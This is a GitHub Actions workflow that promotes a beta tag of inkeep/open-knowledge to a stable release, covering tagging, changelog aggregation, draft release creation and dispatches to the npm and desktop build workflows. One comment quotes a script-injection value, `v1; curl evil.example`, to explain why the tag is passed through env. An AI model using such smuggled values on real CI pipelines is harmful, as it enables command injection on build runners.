name: Promote stable

# On-demand stable promotion on inkeep/open-knowledge.
#
# Triggered three equivalent ways (all resolve to a single beta tag):
#   - workflow_dispatch with an explicit beta_tag (e.g., v0.4.0-beta.3).
#   - workflow_dispatch with a blank beta_tag -> promotes the newest beta.
#   - repository_dispatch {type: promote-stable-latest} from an external
#     trigger (e.g., a Slack Workflow Builder button) -> promotes the newest
#     beta with no inputs; the run resolves the tag itself.
# The workflow:
#   1. Resolves + verifies the beta tag.
#   2. Derives the stable version from the beta tag NAME — strips the
#      `v` prefix and `-beta.N` suffix (v0.4.0-beta.3 -> 0.4.0). The
#      tagged commit's package.json is NOT read: release.yml's zero-
#      commit-bump cadence applies -beta.N via a transient, never-
#      committed jq override, so the tag name is the only authoritative
#      source of the cycle version.
#   3. Tags vX.Y.Z (no suffix) at the SAME SHA as the beta tag.
#   4. Creates a non-prerelease GitHub Release at vX.Y.Z. desktop-release.yml
#      fires automatically and builds the stable DMG with
#      --config.extraMetadata.version=X.Y.Z (override since the legacy commit
#      still has -beta.N in package.json).
#   5. Promotes npm `latest` dist-tag using a transient package.json#version
#      override (same primitive as D11/D13 of the spec — mutation lives only
#      for the workflow run, not committed).
#
# After a successful cut this dispatches main-reset.yml on
# inkeep/agents-private (via the "Inkeep OK Release Bridge" App) to advance
# the base for the next cycle — one-button promotion. When the bridge App
# secrets are absent the dispatch skips and the engineer runs main-reset.yml
# manually (two-button fallback).
#
# Concurrency group is shared with release.yml so beta cuts and stable
# promotions never race on the same legacy state.
#
# Token model. We mint a GitHub App installation token via
# actions/create-github-app-token for every identity-asserting call. The
# workflow-default GITHUB_TOKEN is a GitHub App installation token that
# cannot be granted the `workflows` permission via the permissions: block —
# `workflows` is not a valid permissions key (only contents, issues, etc.
# are). When this workflow tags an old beta SHA whose .github/workflows/
# tree differs from main (the common case after a mirror import of
# promote-stable.yml itself), the App-token policy refuses the push:
#   ! [remote rejected]   v0.5.0 -> v0.5.0
#       (refusing to allow a GitHub App to create or update workflow
#        `.github/workflows/promote-stable.yml` without `workflows`
#        permission)
# The fix REQUIRES the INTERNAL_CI_APP installation on this repo to have
# `workflows: write` — that grant is a one-time admin action in the App's
# installation UI, not something this workflow file can change. If the
# installation lacks the grant, the App token has the same scope problem
# as GITHUB_TOKEN and the `remote rejected` signature recurs on the next
# stale-tree promotion. See sister workflow
# .github/workflows/public-open-knowledge-main-reset.yml on agents-private
# for the same primitive applied to the post-promotion cycle.

on:
  workflow_dispatch:
    inputs:
      beta_tag:
        description: "Beta tag to promote (e.g., v0.4.0-beta.3). Leave blank to promote the newest beta."
        required: false
        type: string
  # Codeless external trigger (e.g., a Slack Workflow Builder button) fires
  # this via POST /repos/inkeep/open-knowledge/dispatches with body
  # {"event_type": "promote-stable-latest"}. No client_payload is read — the
  # run resolves the newest vX.Y.Z-beta.N tag itself (see "Resolve beta tag
  # to promote"), so "promote the latest beta" is a parameterless action.
  # repository_dispatch only fires the workflow file on the default branch.
  repository_dispatch:
    types: [promote-stable-latest]

permissions:
  # Workflow-default GITHUB_TOKEN keeps contents: write so non-tag operations
  # (gh release notes preview, etc.) work. All tag-push, release creation,
  # and repository_dispatch calls run under the App-minted token (see
  # `Generate GitHub App token` step). npm publish (id-token) is delegated
  # to release.yml via repository_dispatch so this workflow does not need
  # id-token; the dispatched run keeps its own OIDC identity. No packages:
  # write — see release.yml's permission comment for why npm publishing
  # does not need that scope here.
  contents: write

concurrency:
  group: ok-release-cadence
  cancel-in-progress: false

jobs:
  promote:
    name: Promote ${{ inputs.beta_tag || 'newest beta' }} to stable
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - name: Generate GitHub App token
        # See top-of-file token-model comment. The minted token only
        # bypasses the App-token policy if the App's installation on
        # this repo has `workflows: write` — which the workflow-default
        # GITHUB_TOKEN cannot have (the `workflows` permission is not
        # a valid permissions: key). The installation grant is a
        # one-time admin action; see the PR's Required human follow-up.
        id: app-token
        uses: actions/create-github-app-token@1b10c78c7865c340bc4f6099eb2f838309f1e8c3 # v3.1.1
        with:
          # Public client ID for inkeep-internal-ci (non-secret; supersedes the deprecated app-id input).
          client-id: Iv23liNt1mrrdgVKHn8K
          private-key: ${{ secrets.INTERNAL_CI_APP_PRIVATE_KEY }}

      - name: Checkout
        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
        with:
          fetch-depth: 0
          # Persist the App token into .git/config so the later
          # `git push origin "$STABLE_TAG"` step uses App identity.
          # Without this, persist-credentials defaults to the workflow's
          # GITHUB_TOKEN and the push hits the App-token workflow-change
          # check on any beta whose .github/workflows/ tree differs from
          # main HEAD.
          token: ${{ steps.app-token.outputs.token }}
          # We need to operate on the beta tag's SHA for the package.json
          # override + bun changeset publish. We resolve and check it out
          # explicitly below; default-branch checkout above is just so the
          # workflow scripts (this file) live next to a writable working
          # tree.

      - name: Resolve beta tag to promote
        # workflow_dispatch may carry an explicit beta_tag; repository_dispatch
        # (and a blank manual dispatch) carry none, so promote the newest beta.
        # Every candidate shares the vX.Y.Z-beta.<digits> shape, so version sort
        # (versioncmp: numeric digit-run compare) orders BOTH the X.Y.Z and the
        # beta.N components correctly — head of the descending sort is the
        # current cycle head. `inputs.beta_tag` is empty (not an error) on
        # repository_dispatch, which routes us into the auto-resolve branch.
        id: resolve
        env:
          INPUT_BETA_TAG: ${{ inputs.beta_tag }}
        run: |
          set -euo pipefail
          if [[ -n "${INPUT_BETA_TAG:-}" ]]; then
            RESOLVED="$INPUT_BETA_TAG"
            echo "auto=false" >> "$GITHUB_OUTPUT"
            echo "Using explicitly provided beta tag: $RESOLVED"
          else
            RESOLVED=$(git tag --list 'v*-beta.*' --sort=-version:refname \
              | grep -E '^v[0-9]+\.[0-9]+\.[0-9]+-beta\.[0-9]+$' \
              | head -n 1 || true)
            if [[ -z "$RESOLVED" ]]; then
              echo "::error::No vX.Y.Z-beta.N tags found to promote. Did the auto-cadence beta release run?"
              exit 1
            fi
            echo "auto=true" >> "$GITHUB_OUTPUT"
            echo "Auto-resolved newest beta tag: $RESOLVED"
          fi
          echo "beta_tag=$RESOLVED" >> "$GITHUB_OUTPUT"

      - name: Guard - auto-resolved beta is unpromoted + fully cut
        # Only the auto path (Slack button / blank dispatch) needs these
        # guards. The explicit beta_tag path is an operator override that
        # keeps the workflow's idempotent recovery behavior (re-run to repair
        # a partial promotion), so it bypasses this step.
        if: steps.resolve.outputs.auto == 'true'
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          BETA_TAG: ${{ steps.resolve.outputs.beta_tag }}
        run: |
          set -euo pipefail

          # Guard A — must not already be promoted to stable. After a
          # promotion the newest beta tag still points at the just-promoted
          # version until a fresh beta is cut. release.yml's "beta base must
          # lead the latest stable" guard guarantees no new vX.Y.Z-beta.M is
          # cut once vX.Y.Z exists, so a present stable tag means this beta is
          # already released — re-promoting would re-publish an existing npm
          # version (hard error) and re-upload onto the live stable Release.
          STABLE_TAG="v$(printf '%s' "$BETA_TAG" | sed -E 's/^v//; s/-beta\.[0-9]+$//')"
          if git rev-parse "refs/tags/${STABLE_TAG}" >/dev/null 2>&1; then
            echo "::error::Newest beta ${BETA_TAG} is already promoted to stable ${STABLE_TAG}. Cut a new beta before promoting again — there is nothing newer to release."
            exit 1
          fi

          # Guard B — the beta cut must be COMPLETE. release.yml creates the
          # beta Release as --draft; desktop-release.yml flips it to published
          # ONLY after the signed DMG + beta-mac.yml upload succeeds, and it
          # runs on a SEPARATE concurrency group, so promote-stable can
          # otherwise acquire the release lock while the DMG is still building
          # (up to 45 min). npm beta publish happens earlier in the same
          # pipeline, so a published release implies the npm artifact too. A
          # draft or asset-less release = the cut is in-flight or failed;
          # promoting it would build stable from an unvalidated SHA.
          meta=$(gh release view "$BETA_TAG" --json isDraft,assets 2>/dev/null || true)
          if [[ -z "$meta" ]]; then
            echo "::error::No GitHub Release exists for ${BETA_TAG} yet — its beta cut has not finished creating the release. Wait for the cut to complete, then retry."
            exit 1
          fi
          isDraft=$(printf '%s' "$meta" | jq -r '.isDraft')
          dmg=$(printf '%s' "$meta" | jq -r '[.assets[].name | select(endswith(".dmg"))] | length')
          manifest=$(printf '%s' "$meta" | jq -r '[.assets[].name | select(endswith("-mac.yml"))] | length')
          if [[ "$isDraft" == "true" || "$dmg" -eq 0 || "$manifest" -eq 0 ]]; then
            echo "::error::Beta ${BETA_TAG} is not fully cut (draft=${isDraft}, dmg=${dmg}, mac.yml=${manifest}). Its desktop-release build is still running or failed — wait a few minutes and retry, or fix the failed cut before promoting."
            exit 1
          fi
          echo "Beta ${BETA_TAG} is complete (published, ${dmg} dmg, ${manifest} mac.yml) and not yet promoted to ${STABLE_TAG}; safe to promote."

      - name: Verify beta tag exists
        env:
          BETA_TAG: ${{ steps.resolve.outputs.beta_tag }}
        run: |
          set -euo pipefail
          # actions/checkout fetches all refs with fetch-depth: 0; verify
          # the resolved tag is present.
          if ! git rev-parse "refs/tags/${BETA_TAG}" >/dev/null 2>&1; then
            echo "::error::Beta tag '${BETA_TAG}' not found on legacy. Did the auto-cadence release run?"
            exit 1
          fi
          echo "Tag ${BETA_TAG} resolves to $(git rev-parse "refs/tags/${BETA_TAG}")"

      - name: Compute stable version from beta tag
        id: ver
        env:
          BETA_TAG: ${{ steps.resolve.outputs.beta_tag }}
        run: |
          set -euo pipefail
          # Derive the version from the beta tag NAME, not from package.json
          # at the tagged commit. release.yml's zero-commit-bump cadence
          # applies the -beta.N version via a transient jq override that is
          # never committed (its `Restore working tree` step reverts it), so
          # the tagged commit's package.json still carries the placeholder
          # version on main. The tag name is the only authoritative source
          # of the cycle version.
          if [[ ! "$BETA_TAG" =~ ^v([0-9]+\.[0-9]+\.[0-9]+)-beta\.[0-9]+$ ]]; then
            echo "::error::Beta tag '$BETA_TAG' is not in the expected vX.Y.Z-beta.N format."
            exit 1
          fi

          BETA_VERSION="${BETA_TAG#v}"
          STABLE_VERSION="${BASH_REMATCH[1]}"
          STABLE_TAG="v${STABLE_VERSION}"
          BETA_SHA=$(git rev-parse "refs/tags/${BETA_TAG}")

          {
            echo "beta_version=$BETA_VERSION"
            echo "stable_version=$STABLE_VERSION"
            echo "stable_tag=$STABLE_TAG"
            echo "beta_sha=$BETA_SHA"
          } >> "$GITHUB_OUTPUT"

          echo "Promoting beta tag $BETA_TAG (SHA $BETA_SHA) to stable $STABLE_VERSION ($STABLE_TAG)"

      - name: Tag stable at beta SHA
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
          BETA_SHA: ${{ steps.ver.outputs.beta_sha }}
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"

          # Idempotency: a re-run after a transient failure should not
          # explode if the tag already exists.
          if git rev-parse "refs/tags/${STABLE_TAG}" >/dev/null 2>&1; then
            EXISTING=$(git rev-parse "refs/tags/${STABLE_TAG}")
            if [[ "$EXISTING" != "$BETA_SHA" ]]; then
              echo "::error::Stable tag ${STABLE_TAG} already exists at ${EXISTING} (expected ${BETA_SHA}). Refusing to retag."
              exit 1
            fi
            echo "Tag ${STABLE_TAG} already at ${BETA_SHA}; skipping git tag step."
          else
            git tag "$STABLE_TAG" "$BETA_SHA"
            git push origin "$STABLE_TAG"
          fi

      - name: Aggregate beta release bodies since previous stable
        id: changelog
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
          BETA_SHA: ${{ steps.ver.outputs.beta_sha }}
          STABLE_VERSION: ${{ steps.ver.outputs.stable_version }}
          # Pass the resolved beta tag via env to keep ${{ }} expression
          # interpolation out of the run: block — direct ${{ }} substitution
          # in shell is a script-injection foothold (a malicious tag value
          # like `v1; curl evil.example` would expand textually before bash
          # parsed the printf invocation). Defense-in-depth even though
          # dispatching this workflow requires repo write access.
          BETA_TAG_INPUT: ${{ steps.resolve.outputs.beta_tag }}
        run: |
          set -euo pipefail
          BODY_FILE=$(mktemp)

          # Resolve the previous stable tag (most recent tag matching v*.*.*
          # without -beta suffix, ancestor of the beta SHA). May be empty for
          # the first-ever stable.
          PREV_STABLE=$(git tag --list 'v*' --sort=-version:refname \
            --merged "$BETA_SHA" \
            | grep -E '^v[0-9]+\.[0-9]+\.[0-9]+$' \
            | grep -v "^${STABLE_TAG}$" \
            | head -n 1 || true)

          if [[ -n "$PREV_STABLE" ]]; then
            echo "Aggregating betas in range ${PREV_STABLE}..${STABLE_TAG}"
            BETA_TAGS_IN_RANGE=$(git tag --list "v${STABLE_VERSION}-beta.*" --merged "$BETA_SHA" --sort=version:refname | grep -v "^${PREV_STABLE}$" || true)
          else
            echo "No previous stable tag; aggregating all betas at ${STABLE_VERSION}"
            BETA_TAGS_IN_RANGE=$(git tag --list "v${STABLE_VERSION}-beta.*" --merged "$BETA_SHA" --sort=version:refname || true)
          fi

          # Under the zero-commit-bump cadence, beta release bodies are
          # the source of truth — packages/*/CHANGELOG.md no longer
          # accumulates per-beta entries (only per-stable, written by
          # main-reset's `bun changeset version` at promotion time). Each
          # beta body now carries ONLY the delta introduced in that beta
          # (compute-next-beta.mjs filters against the prior beta's
          # embedded consumed-set marker), so simple concatenation across
          # the cycle's betas yields a clean cumulative changelog with no
          # duplication.
          #
          # Stripped from each body before concatenation:
          #   - `<!-- ok-consumed-set: ... -->` markers (internal bookkeeping)
          #   - `Delta since previous beta (...) — N new changesets.`  header
          #     (the per-beta subheading we emit here is the right framing)
          {
            printf '## %s\n\n' "$STABLE_VERSION"
            printf 'Stable promotion of beta %s.\n\n' "$BETA_TAG_INPUT"
            if [[ -n "$BETA_TAGS_IN_RANGE" ]]; then
              printf 'Aggregated changes since previous stable:\n\n'
              for tag in $BETA_TAGS_IN_RANGE; do
                BETA_VER=${tag#v}
                printf '### %s\n\n' "$BETA_VER"
                if BODY=$(gh release view "$tag" --json body --jq .body 2>/dev/null) && [[ -n "$BODY" ]]; then
                  printf '%s\n' "$BODY" \
                    | sed -E -e '/^<!-- ok-consumed-set:.*-->$/d' \
                             -e '/^(Delta since previous beta|First beta of the cycle).*$/d' \
                    | awk 'NF{p=1} p'
                else
                  printf '_(release body unavailable for %s)_\n' "$tag"
                fi
                printf '\n'
              done
            fi
          } > "$BODY_FILE"

          # GitHub rejects release bodies over 125,000 chars with HTTP 422.
          # A long beta cycle (dozens of betas, each contributing its delta)
          # can blow past that. Cap with margin and point readers at the full
          # per-beta history rather than failing the whole promotion.
          MAX_BODY=120000
          if [[ $(wc -c < "$BODY_FILE") -gt $MAX_BODY ]]; then
            echo "Aggregated body $(wc -c < "$BODY_FILE") chars exceeds ${MAX_BODY}; truncating."
            TRUNC=$(mktemp)
            # Cut at MAX_BODY bytes, then drop the (now-partial) last line.
            head -c "$MAX_BODY" "$BODY_FILE" | sed '$d' > "$TRUNC"
            {
              printf '\n\n---\n\n'
              printf '_Changelog truncated to fit GitHub'\''s 125,000-character release-body limit. '
              printf 'Full per-beta history: https://github.com/%s/releases_\n' "$GITHUB_REPOSITORY"
            } >> "$TRUNC"
            mv "$TRUNC" "$BODY_FILE"
          fi

          echo "body_file=$BODY_FILE" >> "$GITHUB_OUTPUT"
          echo "---- Release body preview ----"
          cat "$BODY_FILE"
          echo "------------------------------"

      - name: Create stable GitHub Release
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
          BETA_SHA: ${{ steps.ver.outputs.beta_sha }}
          BODY_FILE: ${{ steps.changelog.outputs.body_file }}
        run: |
          set -euo pipefail
          # Idempotency: a re-run after a transient failure should not
          # explode if the Release already exists.
          if gh release view "$STABLE_TAG" >/dev/null 2>&1; then
            # Idempotent re-run after a transient failure (e.g., the draft
            # was created but desktop-release.yml never promoted it). The
            # combined PATCH (--draft=false + --prerelease=false + --latest)
            # is empirically atomic: GitHub evaluates the make_latest
            # constraint against the post-request state, so the draft→
            # published flip and Latest stamp succeed in a single call.
            # No-op on an already-published release.
            echo "Release ${STABLE_TAG} already exists; updating notes + ensuring published + --latest."
            gh release edit "$STABLE_TAG" --notes-file "$BODY_FILE" --draft=false --prerelease=false --latest
          else
            # Create as draft so the release is invisible in the .atom feed
            # until desktop-release.yml uploads latest-mac.yml AND promotes
            # draft → published. --latest is deferred to the promote step
            # because GitHub's API rejects make_latest=true on drafts. See
            # packages/desktop/src/main/auto-updater.ts:336-356 for the
            # channel-mirror invariant this protects.
            gh release create "$STABLE_TAG" \
              --draft \
              --target "$BETA_SHA" \
              --title "$STABLE_TAG" \
              --notes-file "$BODY_FILE"
          fi

      - name: Trigger release.yml to publish stable to npm
        # Same-repo repository_dispatch into release.yml. release.yml
        # listens for event_type=publish-stable, checks out the stable
        # tag, applies the transient package.json#version override, and
        # runs `bun changeset publish --tag latest --provenance` via
        # npm Trusted Publishing OIDC.
        #
        # Why we delegate to release.yml instead of publishing here:
        # npm Trusted Publishing only allows ONE trusted-publisher entry
        # per package. Centralizing the publish call in release.yml
        # means the npmjs.com TP entry only authorizes one workflow
        # filename. promote-stable.yml owns tag + Release creation; npm
        # publishing lives in release.yml.
        #
        # Dispatch runs under the App-minted token so the sender identity
        # is consistent with the rest of this workflow. The dispatched
        # release.yml run gets its own OIDC identity (workflow=release.yml)
        # which is what the npm TP entry binds against — the sender is
        # not part of the TP claim, so swapping it from GITHUB_TOKEN to
        # the App token does not affect publish auth.
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
          STABLE_VERSION: ${{ steps.ver.outputs.stable_version }}
        run: |
          set -euo pipefail
          payload=$(jq -nc \
            --arg ref "$STABLE_TAG" \
            --arg version "$STABLE_VERSION" \
            '{event_type: "publish-stable", client_payload: {ref: $ref, version: $version}}')
          gh api -X POST "repos/${GITHUB_REPOSITORY}/dispatches" --input - <<<"$payload"
          echo "Dispatched publish-stable to release.yml (ref=${STABLE_TAG}, version=${STABLE_VERSION})."
          echo "release.yml will run the npm publish + provenance attestation in its own job."

      - name: Trigger desktop-release.yml to build + upload stable DMG
        # The `gh release create` above creates the release as `--draft`
        # so it stays out of the .atom feed until desktop-release.yml
        # uploads latest-mac.yml AND promotes draft → published. GitHub
        # does NOT fire `release: published` on a draft creation — it
        # fires on the draft → published transition, which doesn't
        # happen until desktop-release.yml does it later. Explicit
        # `repository_dispatch` is how we kick off desktop-release.yml
        # at draft-creation time. (App tokens, unlike GITHUB_TOKEN, do
        # cascade workflow events; the token swap in this PR does not
        # remove the need for the explicit dispatch — the draft state
        # is the load-bearing reason.)
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
        run: |
          set -euo pipefail
          payload=$(jq -nc \
            --arg tag "$STABLE_TAG" \
            --arg ref "$STABLE_TAG" \
            '{event_type: "desktop-release", client_payload: {release_tag: $tag, ref: $ref}}')
          gh api -X POST "repos/${GITHUB_REPOSITORY}/dispatches" --input - <<<"$payload"
          echo "Dispatched desktop-release for ${STABLE_TAG}; desktop-release.yml will build the signed DMG and upload it + latest-mac.yml to the stable Release."

      - name: Detect bridge App for cross-repo dispatch
        # Auto-triggering main-reset.yml on agents-private needs a credential
        # with write access to THAT repo; the workflow-default GITHUB_TOKEN is
        # scoped to legacy only and cannot dispatch cross-repo. The "Inkeep OK
        # Release Bridge" GitHub App supplies it: installed on agents-private,
        # its App-ID + private key live in legacy's secrets, and the next step
        # mints a short-lived installation token at runtime (no static
        # long-lived token stored). If the App secrets are absent the bridge
        # is not configured — skip silently and promotion stays two-button
        # (engineer runs main-reset.yml manually). Secrets cannot be read in
        # `if:` expressions, so the presence check runs here and gates the
        # mint + dispatch steps via an output.
        id: bridge-check
        env:
          OK_RELEASE_BRIDGE_APP_ID: ${{ secrets.OK_RELEASE_BRIDGE_APP_ID }}
        run: |
          set -euo pipefail
          if [[ -n "${OK_RELEASE_BRIDGE_APP_ID:-}" ]]; then
            echo "configured=true" >> "$GITHUB_OUTPUT"
          else
            echo "configured=false" >> "$GITHUB_OUTPUT"
            echo "OK_RELEASE_BRIDGE_APP_ID not set — skipping auto-trigger of main-reset; promotion stays two-button (run main-reset.yml manually on agents-private)."
          fi

      - name: Mint cross-repo dispatch token (bridge App)
        if: steps.bridge-check.outputs.configured == 'true'
        id: bridge-token
        uses: actions/create-github-app-token@1b10c78c7865c340bc4f6099eb2f838309f1e8c3 # v3.1.1
        with:
          # Public client ID for inkeep-ok-release-bridge (non-secret; supersedes the deprecated app-id input).
          client-id: Iv23lii4qS2FAc6tkzfI
          private-key: ${{ secrets.OK_RELEASE_BRIDGE_APP_PRIVATE_KEY }}
          # The bridge App is installed on agents-private, not on legacy
          # (where this workflow runs). owner + repositories scope the minted
          # token to that cross-repo installation.
          owner: inkeep
          repositories: agents-private

      - name: Trigger main-reset on agents-private
        if: steps.bridge-check.outputs.configured == 'true'
        env:
          GH_TOKEN: ${{ steps.bridge-token.outputs.token }}
          STABLE_VERSION: ${{ steps.ver.outputs.stable_version }}
        run: |
          set -euo pipefail
          payload=$(jq -nc --arg v "$STABLE_VERSION" \
            '{event_type: "main-reset", client_payload: {stable_version: $v}}')
          gh api -X POST "repos/inkeep/agents-private/dispatches" --input - <<<"$payload"
          echo "Dispatched main-reset to agents-private (stable_version=${STABLE_VERSION})."
